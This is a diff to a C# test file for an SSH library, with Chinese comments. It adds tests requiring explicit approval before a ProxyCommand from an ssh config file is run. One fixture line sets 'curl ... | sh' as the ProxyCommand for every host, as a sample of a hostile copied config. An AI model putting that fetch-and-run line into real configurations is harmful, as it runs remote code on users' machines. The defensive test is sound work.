@@ -123,16 +123,53 @@ public sealed class SshConfigConnectTests
                 ProxyCommand none
             """);
 
-        SshConnectionOptions viaCommand = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "viacmd");
+        List<SshProxyCommandRequest> asked = [];
+        SshConfigConnectOptions approveAll = new()
+        {
+            ApproveProxyCommand = (request, _) =>
+            {
+                asked.Add(request);
+                return ValueTask.FromResult(true);
+            },
+        };
+
+        SshConnectionOptions viaCommand = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "viacmd", approveAll);
         var command = (ProxyCommandDialer)viaCommand.Dialer;
         Assert.AreEqual("nc -x proxy:1080 %h %p", command.CommandTemplate);
         Assert.AreEqual("joe", command.UserName);
 
-        SshConnectionOptions both = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "both");
+        // 批准的是展开之后、将要执行的那一行。
+        SshProxyCommandRequest request = Assert.ContainsSingle(asked);
+        Assert.AreEqual("viacmd", request.Host);
+        Assert.AreEqual("nc -x proxy:1080 viacmd 22", request.Command);
+
+        SshConnectionOptions both = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "both", approveAll);
         Assert.IsInstanceOfType<SshJumpDialer>(both.Dialer);
+        Assert.HasCount(1, asked, "ProxyJump 压过 ProxyCommand 时那条命令用不上，也就不问");
 
         SshConnectionOptions none = await SshConfigFile.CreateConnectionOptionsAsync(blocks, "none");
         Assert.IsInstanceOfType<TcpTransportDialer>(none.Dialer);
+    }
+
+    [TestMethod]
+    public async Task 配置里的ProxyCommand没被批准就不执行_也不悄悄直连()
+    {
+        // 与 Match exec 同一条理由：配置文件常常是从别处拷来的，
+        // 一行 Host * 加一行 ProxyCommand 就是「连任何一台主机都先在本机跑一个程序」。
+        IReadOnlyList<SshConfigBlock> blocks = SshConfigFile.Parse("""
+            Host *
+                ProxyCommand curl -s https://example.invalid/x | sh
+            """);
+
+        SshConnectException noApprover = await Assert.ThrowsExactlyAsync<SshConnectException>(
+            async () => await SshConfigFile.CreateConnectionOptionsAsync(blocks, "web"));
+        Assert.AreEqual(SshFailureReason.InvalidConfiguration, noApprover.Reason);
+        Assert.Contains("ApproveProxyCommand", noApprover.Message);
+
+        SshConnectException denied = await Assert.ThrowsExactlyAsync<SshConnectException>(
+            async () => await SshConfigFile.CreateConnectionOptionsAsync(
+                blocks, "web", new SshConfigConnectOptions { ApproveProxyCommand = (_, _) => ValueTask.FromResult(false) }));
+        Assert.AreEqual(SshFailureReason.InvalidConfiguration, denied.Reason);
     }
 
     [TestMethod]
